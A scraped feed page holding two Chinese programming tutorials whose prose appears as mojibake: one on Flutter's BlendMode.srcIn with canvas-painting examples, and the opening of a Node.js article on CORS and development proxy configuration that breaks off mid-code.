.hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>SRC_IN</p>
<p><code>Keeps the source pixels that cover the destination pixels, discards the remaining source and destination pixels.</code></p>
<p>è®¡ç®—å…¬å¼</p>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/17e9298a9851429883786947bbdce669~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54Gr5p-05bCx5piv5oiR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768381538&amp;x-signature=xn2nBRmuIUa%2Bs5CKmuPAknVOF5s%3D" alt="image.png" width="30%" loading="lazy"/>
<p>å¤§ç™½è¯å°±æ˜¯ï¼šåœ¨dsté€æ˜åº¦æ˜¯1çš„æ—¶å€™,é‡å éƒ¨åˆ†æ˜¾ç¤ºçš„å°±æ˜¯srcçš„å†…å®¹ã€‚éé‡å éƒ¨åˆ†src ç›´æ¥å…¨éƒ¨ä¸¢å¼ƒ,dstä¸ä¿®æ”¹ã€‚</p>
<p>ç¬¬ä¸€ä¸ªä¾‹å­:</p>
<pre><code class="hljs language-js" lang="js">  @override
  <span class="hljs-keyword">void</span> <span class="hljs-title function_">paint</span>(<span class="hljs-params">Canvas canvas, Size size</span>) {
    <span class="hljs-keyword">var</span> width = size.<span class="hljs-property">width</span>;
    <span class="hljs-keyword">var</span> height = size.<span class="hljs-property">height</span>;

    canvas.<span class="hljs-title function_">saveLayer</span>(<span class="hljs-title class_">Rect</span>.<span class="hljs-title function_">fromLTWH</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, width, height), <span class="hljs-title class_">Paint</span>());
    <span class="hljs-title class_">Paint</span> dstPaint = <span class="hljs-title class_">Paint</span>()..<span class="hljs-property">color</span> = <span class="hljs-title class_">Colors</span>.<span class="hljs-property">red</span>.<span class="hljs-title function_">withOpacity</span>(<span class="hljs-number">0.8</span>);
    dstPaint.<span class="hljs-property">strokeWidth</span> = <span class="hljs-number">20</span>;
    dstPaint.<span class="hljs-property">style</span> = <span class="hljs-title class_">PaintingStyle</span>.<span class="hljs-property">stroke</span>;

    canvas.<span class="hljs-title function_">drawCircle</span>(<span class="hljs-title class_">Offset</span>(width/<span class="hljs-number">2</span>,height/<span class="hljs-number">2</span>), <span class="hljs-number">10</span>, dstPaint);

    canvas.<span class="hljs-title function_">drawCircle</span>(<span class="hljs-title class_">Offset</span>(width/<span class="hljs-number">2</span>,height/<span class="hljs-number">2</span>), <span class="hljs-number">50</span>, dstPaint);

    canvas.<span class="hljs-title function_">drawCircle</span>(<span class="hljs-title class_">Offset</span>(width/<span class="hljs-number">2</span>,height/<span class="hljs-number">2</span>), <span class="hljs-number">90</span>, dstPaint);

    canvas.<span class="hljs-title function_">drawCircle</span>(<span class="hljs-title class_">Offset</span>(width/<span class="hljs-number">2</span>,height/<span class="hljs-number">2</span>), <span class="hljs-number">130</span>, dstPaint);

    <span class="hljs-keyword">var</span> srcPaint = <span class="hljs-title class_">Paint</span>()
      ..<span class="hljs-property">color</span> = <span class="hljs-title class_">Colors</span>.<span class="hljs-property">blue</span> <span class="hljs-comment">// æºé¢œè‰²ï¼šè“è‰²</span>
      ..<span class="hljs-property">style</span> = <span class="hljs-title class_">PaintingStyle</span>.<span class="hljs-property">stroke</span> <span class="hljs-comment">// å¡«å……æ¨¡å¼</span>
      ..<span class="hljs-property">strokeWidth</span> = <span class="hljs-number">50</span>
      ..<span class="hljs-property">blendMode</span> = <span class="hljs-title class_">BlendMode</span>.<span class="hljs-property">srcIn</span>; <span class="hljs-comment">// æ··åˆæ¨¡å¼</span>
    canvas.<span class="hljs-title function_">drawRect</span>(<span class="hljs-title class_">Rect</span>.<span class="hljs-title function_">fromLTWH</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, width, height), srcPaint);
    <span class="hljs-comment">// canvas.drawImageRect(image!, Rect.fromLTWH(0, 0, image!.width.toDouble(), image!.height.toDouble()), Rect.fromLTWH(0, 0, width, height), srcPaint);</span>
    canvas.<span class="hljs-title function_">restore</span>();
  }
</code></pre>
<p>ä¸€ä¸ªçŸ©å½¢è¾¹æ¡†è·Ÿå¤šä¸ªç¯å½¢è¿›è¡ŒsrcInæ··åˆã€‚æ•ˆæœå¦‚ä¸‹ï¼šå¯ä»¥çœ‹å‡ºé‡å éƒ¨åˆ†ä¿ç•™äº†srcï¼Œsrcéé‡å éƒ¨åˆ†ç›´æ¥ä¸¢å¼ƒäº†ã€‚éé‡å dstè¿˜æ˜¯ä¿æŒåŸæ ·ã€‚</p>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b7d143d89ab94cbcabe98f10daaec269~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54Gr5p-05bCx5piv5oiR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768381538&amp;x-signature=qKTcUwalJOkSdlA%2FdpTZnesJpls%3D" alt="image.png" width="30%" loading="lazy"/>
<p>ç¬¬äºŒä¸ªä¾‹å­:ç»™å›¾å½¢è´´çº¸æˆ–è€…è¯´æ˜¯å›¾ç‰‡ä¿ç•™ä»»æ„éƒ¨åˆ†(åªè¦ä½ èƒ½ç”»å‡ºè·¯å¾„)</p>
<pre><code class="hljs language-js" lang="js">  @override
  <span class="hljs-keyword">void</span> <span class="hljs-title function_">paint</span>(<span class="hljs-params">Canvas canvas, Size size</span>) {
    <span class="hljs-keyword">var</span> width = size.<span class="hljs-property">width</span>;
    <span class="hljs-keyword">var</span> height = size.<span class="hljs-property">height</span>;

    canvas.<span class="hljs-title function_">saveLayer</span>(<span class="hljs-title class_">Rect</span>.<span class="hljs-title function_">fromLTWH</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, width, height), <span class="hljs-title class_">Paint</span>());
    <span class="hljs-title class_">Paint</span> dstPaint = <span class="hljs-title class_">Paint</span>()..<span class="hljs-property">color</span> = <span class="hljs-title class_">Colors</span>.<span class="hljs-property">red</span>.<span class="hljs-title function_">withOpacity</span>(<span class="hljs-number">0.8</span>);
    dstPaint.<span class="hljs-property">strokeWidth</span> = <span class="hljs-number">20</span>;
    dstPaint.<span class="hljs-property">style</span> = <span class="hljs-title class_">PaintingStyle</span>.<span class="hljs-property">stroke</span>;

    canvas.<span class="hljs-title function_">drawCircle</span>(<span class="hljs-title class_">Offset</span>(width/<span class="hljs-number">2</span>,height/<span class="hljs-number">2</span>), <span class="hljs-number">10</span>, dstPaint);

    canvas.<span class="hljs-title function_">drawCircle</span>(<span class="hljs-title class_">Offset</span>(width/<span class="hljs-number">2</span>,height/<span class="hljs-number">2</span>), <span class="hljs-number">50</span>, dstPaint);

    canvas.<span class="hljs-title function_">drawCircle</span>(<span class="hljs-title class_">Offset</span>(width/<span class="hljs-number">2</span>,height/<span class="hljs-number">2</span>), <span class="hljs-number">90</span>, dstPaint);

    canvas.<span class="hljs-title function_">drawCircle</span>(<span class="hljs-title class_">Offset</span>(width/<span class="hljs-number">2</span>,height/<span class="hljs-number">2</span>), <span class="hljs-number">130</span>, dstPaint);

    <span class="hljs-keyword">var</span> srcPaint = <span class="hljs-title class_">Paint</span>()
      ..<span class="hljs-property">color</span> = <span class="hljs-title class_">Colors</span>.<span class="hljs-property">blue</span> <span class="hljs-comment">// æºé¢œè‰²ï¼šè“è‰²</span>
      ..<span class="hljs-property">style</span> = <span class="hljs-title class_">PaintingStyle</span>.<span class="hljs-property">stroke</span> <span class="hljs-comment">// å¡«å……æ¨¡å¼</span>
      ..<span class="hljs-property">strokeWidth</span> = <span class="hljs-number">50</span>
      ..<span class="hljs-property">blendMode</span> = <span class="hljs-title class_">BlendMode</span>.<span class="hljs-property">srcIn</span>; <span class="hljs-comment">// æ··åˆæ¨¡å¼</span>
    <span class="hljs-comment">// canvas.drawRect(Rect.fromLTWH(0, 0, width, height), srcPaint);</span>
    canvas.<span class="hljs-title function_">drawImageRect</span>(image!, <span class="hljs-title class_">Rect</span>.<span class="hljs-title function_">fromLTWH</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, image!.<span class="hljs-property">width</span>.<span class="hljs-title function_">toDouble</span>(), image!.<span class="hljs-property">height</span>.<span class="hljs-title function_">toDouble</span>()), <span class="hljs-title class_">Rect</span>.<span class="hljs-title function_">fromLTWH</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, width, height), srcPaint);
    canvas.<span class="hljs-title function_">restore</span>();
  }
</code></pre>
<p>æ•ˆæœå›¾å¦‚ä¸‹:æŠŠä¸€å¼ å›¾ç‰‡è´´åˆ°äº†ç¯å½¢ä¸Šé¢ï¼Œå¦‚æœdstæ˜¯ä¸ªåœ†å½¢ï¼Œé‚£å°±æ˜¯åœ†å½¢å¤´åƒã€‚</p>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a9617663f5dc429f9aa89fd747183c58~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54Gr5p-05bCx5piv5oiR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768381538&amp;x-signature=2oBDA2%2FLZYbYV%2F9vwgCU7elaroQ%3D" alt="image.png" width="30%" loading="lazy"/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Node.js ç¼–ç¨‹å®æˆ˜ï¼šå‰åç«¯ç»“åˆ - è·¨åŸŸä¸ä»£ç†é…ç½®]]></title>    <link>https://juejin.cn/post/7592147054785921075</link>    <guid>https://juejin.cn/post/7592147054785921075</guid>    <pubDate>2026-01-07T01:17:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592147054785921075" data-draft-id="7592251792630841371" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Node.js ç¼–ç¨‹å®æˆ˜ï¼šå‰åç«¯ç»“åˆ - è·¨åŸŸä¸ä»£ç†é…ç½®"/> <meta itemprop="keywords" content="åç«¯,å‰ç«¯,Node.js"/> <meta itemprop="datePublished" content="2026-01-07T01:17:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¨‹åºå‘˜çˆ±é’“é±¼"/> <meta itemprop="url" content="https://juejin.cn/user/2799775299157614"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Node.js ç¼–ç¨‹å®æˆ˜ï¼šå‰åç«¯ç»“åˆ - è·¨åŸŸä¸ä»£ç†é…ç½®
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2799775299157614/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¨‹åºå‘˜çˆ±é’“é±¼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-07T01:17:50.000Z" title="Wed Jan 07 2026 01:17:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-07
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>åœ¨ç°ä»£ Web å¼€å‘ä¸­ï¼Œå‰åç«¯åˆ†ç¦»å·²æˆä¸ºä¸»æµæ¶æ„ã€‚åœ¨è¿™ç§æ¶æ„ä¸‹ï¼Œå‰ç«¯å’Œåç«¯é€šå¸¸éƒ¨ç½²åœ¨ä¸åŒçš„åŸŸæˆ–ç«¯å£ä¸Šï¼Œå› æ­¤è·¨åŸŸé—®é¢˜å˜å¾—å°¤ä¸ºé‡è¦ã€‚å°¤å…¶åœ¨å¼€å‘è¿‡ç¨‹ä¸­ï¼Œå¦‚ä½•é«˜æ•ˆåœ°å¤„ç†è·¨åŸŸè¯·æ±‚å’Œé…ç½®ä»£ç†ï¼Œç›´æ¥å½±å“ç€å‰åç«¯åä½œçš„æ•ˆç‡å’Œå¼€å‘ä½“éªŒã€‚</p>
</blockquote>
<p>æœ¬æ–‡å°†è¯¦ç»†ä»‹ç»å¦‚ä½•åœ¨ Node.js ä¸­å¤„ç†è·¨åŸŸé—®é¢˜ï¼Œä»¥åŠå¦‚ä½•é€šè¿‡ä»£ç†é…ç½®ç®€åŒ–å¼€å‘æµç¨‹ã€‚</p>
<hr/>
<h2 data-id="heading-0">ä¸€ã€ä»€ä¹ˆæ˜¯è·¨åŸŸé—®é¢˜</h2>
<p>è·¨åŸŸé—®é¢˜æ˜¯æŒ‡æµè§ˆå™¨çš„åŒæºç­–ç•¥ï¼ˆSame-Origin Policyï¼‰é™åˆ¶äº†ä¸åŒåŸŸã€åè®®æˆ–ç«¯å£ä¹‹é—´çš„ç›¸äº’è®¿é—®ã€‚åœ¨å‰åç«¯åˆ†ç¦»æ¶æ„ä¸­ï¼Œå‰ç«¯é€šå¸¸éƒ¨ç½²åœ¨ä¸€ä¸ªåŸŸï¼ˆå¦‚ <code>localhost:3000</code>ï¼‰ï¼Œåç«¯åˆ™éƒ¨ç½²åœ¨å¦ä¸€ä¸ªåŸŸï¼ˆå¦‚ <code>localhost:5000</code>ï¼‰ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œå‰ç«¯å‘èµ·çš„è¯·æ±‚å°±ä¼šé‡åˆ°è·¨åŸŸé—®é¢˜ã€‚</p>
<p><strong>åŒæºç­–ç•¥</strong>è¦æ±‚ï¼šåè®®ã€åŸŸåå’Œç«¯å£ä¸‰è€…å¿…é¡»å®Œå…¨ç›¸åŒï¼Œæ‰èƒ½å…è®¸è·¨ç«™è¯·æ±‚ã€‚</p>
<hr/>
<h2 data-id="heading-1">äºŒã€è·¨åŸŸçš„è§£å†³æ–¹æ³•</h2>
<p>è§£å†³è·¨åŸŸé—®é¢˜çš„æ–¹æ³•æœ‰å¾ˆå¤šç§ï¼Œæœ€å¸¸è§çš„æœ‰ä»¥ä¸‹å‡ ç§ï¼š</p>
<ol>
<li>
<p><strong>CORSï¼ˆè·¨åŸŸèµ„æºå…±äº«ï¼‰</strong>
åç«¯é€šè¿‡è®¾ç½® HTTP å¤´éƒ¨ï¼Œå…è®¸æ¥è‡ªä¸åŒåŸŸçš„è¯·æ±‚ã€‚</p>
</li>
<li>
<p><strong>JSONPï¼ˆJSON with Paddingï¼‰</strong>
åˆ©ç”¨ <code>&lt;script&gt;</code> æ ‡ç­¾çš„è·¨åŸŸèƒ½åŠ›ï¼Œé€šå¸¸åªæ”¯æŒ GET è¯·æ±‚ã€‚</p>
</li>
<li>
<p><strong>ä»£ç†</strong>
å‰ç«¯å¼€å‘æ—¶é€šè¿‡ä»£ç†å°†è¯·æ±‚è½¬å‘åˆ°åç«¯ï¼Œé¿å…æµè§ˆå™¨çš„è·¨åŸŸé™åˆ¶ã€‚</p>
</li>
</ol>
<hr/>
<h2 data-id="heading-2">ä¸‰ã€Node.js å¤„ç†è·¨åŸŸï¼šCORS</h2>
<p>CORS æ˜¯ç›®å‰æœ€å¸¸ç”¨çš„è·¨åŸŸè§£å†³æ–¹æ¡ˆã€‚CORS æ˜¯ä¸€ç§æœºåˆ¶ï¼Œå…è®¸æµè§ˆå™¨å‘è·¨æºæœåŠ¡å™¨å‘å‡º XMLHttpRequest è¯·æ±‚ï¼Œä»è€Œå…‹æœåŒæºç­–ç•¥çš„é™åˆ¶ã€‚Node.js å¯ä»¥ä½¿ç”¨ <code>cors</code> ä¸­é—´ä»¶è½»æ¾å®ç°ã€‚</p>
<h3 data-id="heading-3">1. å®‰è£… <code>cors</code> ä¸­é—´ä»¶</h3>
<pre><code class="hljs language-bash" lang="bash">npm install cors
</code></pre>
<h3 data-id="heading-4">2. é…ç½® CORS</h3>
<p>åœ¨ Node.js ä¸­ï¼Œé€šè¿‡ä½¿ç”¨ <code>cors</code> ä¸­é—´ä»¶ï¼Œå¯ä»¥å…è®¸æŒ‡å®šæºçš„è¯·æ±‚ã€‚ä»¥ä¸‹æ˜¯ä¸€ä¸ªåŸºæœ¬çš„é…ç½®ä¾‹å­ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">'express'</span>);
<span class="hljs-keyword">const</span> cors = <span class="hljs-built_in">require</span>(<span class="hljs-string">'cors'</span>);
<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();

<span class="hljs-comment">// å…è®¸æ‰€æœ‰æ¥æºçš„è¯·æ±‚</span>
app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">cors</span>());

<span class="hljs-comment">// åªå…è®¸ç‰¹å®šæ¥æºçš„è¯·æ±‚</span>
app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">cors</span>({
  <span class="hljs-attr">origin</span>: <span class="hljs-string">'http://localhost:3000'</span>, <span class="hljs-comment">// å…è®¸çš„å‰ç«¯åœ°å€</span>
  <span class="hljs-attr">methods</span>: <span class="hljs-string">'GET,POST'</span>,
  <span class="hljs-attr">allowedHeaders</span>: <span class="hljs-string">'Content-Type,Authorization'</span>
}));

app.<span class="hljs-title function_">get</span>(<span class="hljs-string">'/api/data'</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {
  res.<span class="hljs-title function_">json</span>({ <span class="hljs-attr">message</span>: <span class="hljs-string">'Hello from server'</span> });
});

app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">5000</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Server is running on http://localhost:5000'</span>);
});
</code></pre>
<p>è¿™ç§æ–¹å¼ä¼šè‡ªåŠ¨ä¸ºæ¯ä¸ªå“åº”æ·»åŠ åˆé€‚çš„ CORS å¤´ï¼Œä»è€Œè§£å†³è·¨åŸŸé—®é¢˜ã€‚</p>
<h3 data-id="heading-5">3. å¸¸è§ CORS é…ç½®é€‰é¡¹</h3>
<ul>
<li><strong><code>origin</code></strong>ï¼šè®¾ç½®å…è®¸è®¿é—®çš„æºï¼Œå¯ä»¥æ˜¯ä¸€ä¸ªåŸŸåï¼Œä¹Ÿå¯ä»¥æ˜¯ <code>*</code> æ¥å…è®¸æ‰€æœ‰æ¥æºã€‚</li>
<li><strong><code>methods</code></strong>ï¼šæŒ‡å®šå…è®¸çš„ HTTP æ–¹æ³•ã€‚</li>
<li><strong><code>allowedHeaders</code></strong>ï¼šè®¾ç½®å…è®¸çš„è¯·æ±‚å¤´ã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-6">å››ã€å‰ç«¯ä½¿ç”¨ä»£ç†è§£å†³è·¨åŸŸ</h2>
<p>åœ¨å¼€å‘é˜¶æ®µï¼Œå‰ç«¯å¯ä»¥é€šè¿‡ä»£ç†å°†è¯·æ±‚è½¬å‘åˆ°åç«¯ï¼Œé¿å…æµè§ˆå™¨çš„è·¨åŸŸé™åˆ¶ã€‚å‰ç«¯å¼€å‘æ¡†æ¶å¦‚ Reactã€Vue ç­‰éƒ½æä¾›äº†é…ç½®ä»£ç†çš„æ–¹å¼ã€‚</p>
<h3 data-id="heading-7">1. React ä¸­é…ç½®ä»£ç†</h3>
<p>åœ¨ React é¡¹ç›®ä¸­ï¼Œæœ€ç®€å•çš„ä»£ç†é…ç½®æ–¹å¼æ˜¯é€šè¿‡ <code>package.json</code> æ–‡ä»¶ä¸­çš„ <code>proxy</code> å­—æ®µé…ç½®ã€‚</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"my-app"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"version"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"0.1.0"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"private"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"proxy"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"http://localhost:5000"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>å½“å‰ç«¯è¯·æ±‚ <code>/api/data</code> æ—¶ï¼Œå¼€å‘æœåŠ¡å™¨ä¼šè‡ªåŠ¨ä»£ç†åˆ° <code>http://localhost:5000/api/data</code>ï¼Œé¿å…äº†è·¨åŸŸé—®é¢˜ã€‚</p>
<h3 data-id="heading-8">2. Vue ä¸­é…ç½®ä»£ç†</h3>
<p>åœ¨ Vue é¡¹ç›®ä¸­ï¼Œå¯ä»¥é€šè¿‡ <code>vue.config.js</code> æ¥é…ç½®ä»£ç†ã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
  <span class="hljs-attr">devServer</span>: {
    <span class="hljs-attr">proxy</span>: <span class="hljs-string">'http://localhost:5000'</span>
  }
};
</code></pre>
<p>è¿™æ ·ï¼Œå½“ Vue å‰ç«¯å‘é€è¯·æ±‚æ—¶ï¼Œæ‰€æœ‰è¯·æ±‚éƒ½ä¼šè¢«ä»£ç†åˆ° <code>http://localhost:5000</code>ï¼Œè§£å†³äº†è·¨åŸŸé—®é¢˜ã€‚</p>
<hr/>
<h2 data-id="heading-9">äº”ã€Node.js ä¸­é…ç½®ä»£ç†è½¬å‘è¯·æ±‚</h2>
<p>é™¤äº†å‰ç«¯é…ç½®ä»£ç†ï¼Œåç«¯çš„ Node.js æœåŠ¡å™¨ä¹Ÿå¯ä»¥ä½¿ç”¨ä»£ç†ä¸­é—´ä»¶å°†è¯·æ±‚è½¬å‘åˆ°ç›®æ ‡æœåŠ¡å™¨ï¼Œå¸¸ç”¨çš„ä»£ç†ä¸­é—´ä»¶æ˜¯ <code>http-proxy-middleware</code>ã€‚</p>
<h3 data-id="heading-10">1. å®‰è£… <code>http-proxy-middleware</code></h3>
<pre><code class="hljs language-bash" lang="bash">npm install http-proxy-middleware
</code></pre>
<h3 data-id="heading-11">2. é…ç½®ä»£ç†è½¬å‘</h3>
<p>åœ¨ <code>express</code> ä¸­ï¼Œå¯ä»¥é€šè¿‡ <code>http-proxy-middleware</code> å°†è¯·æ±‚è½¬å‘åˆ°åç«¯ APIã€‚</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">'express'</span>);
<span class="hljs-keyword">const</span> { createProxyMiddleware } = <span class="hljs-built_in">require</span>(<span class="hljs-string">'http-proxy-middleware'</span>);
<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();

<span class="hljs-comment">// ä»£ç† API è¯·æ±‚</span>
app.<span class="hljs-title function_">use</span>(<span class="hljs-string">'/api'</span>, <span class="hljs-title function_">createProxyMiddleware</span>({
  <span class="hljs-attr">target</span>: <span class="hljs-string">'http://localhost:5000'</span>, <span class="hljs-comment">// ç›®æ ‡æœåŠ¡å™¨</span>
  <span class="hljs-attr">changeOrigin</span>: <span class="hljs-literal">true</span>,              <span class="hljs-comment">// æ›´æ”¹æº</span>
  <span class="hljs-attr">pathRewrite</span>: {
    <span class="hljs-string">'^/api'</span>: <span class="hljs-string">''</span>                    <span class="hljs-comment">// é‡å†™è·¯å¾„</span>
  }
}));

app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> {
